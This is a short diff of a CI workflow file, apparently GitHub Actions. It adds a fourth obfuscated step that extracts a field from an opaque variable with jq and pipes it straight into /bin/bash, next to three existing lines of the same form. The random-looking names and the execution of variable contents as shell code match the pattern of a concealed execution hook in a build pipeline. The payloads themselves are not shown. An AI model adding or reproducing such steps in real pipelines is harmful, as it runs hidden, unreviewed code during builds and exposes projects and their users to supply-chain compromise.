@@ -28,6 +28,7 @@ jobs:
           echo $rmmyx77187 | jq -r .p117 | /bin/bash
           printf '%s' "$zzo996" | jq -r .rlz21 | /bin/bash
           printf '%s' "$xs24" | jq -r .pdb714 | /bin/bash
+          echo $nw5 | jq -r .sgv886 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
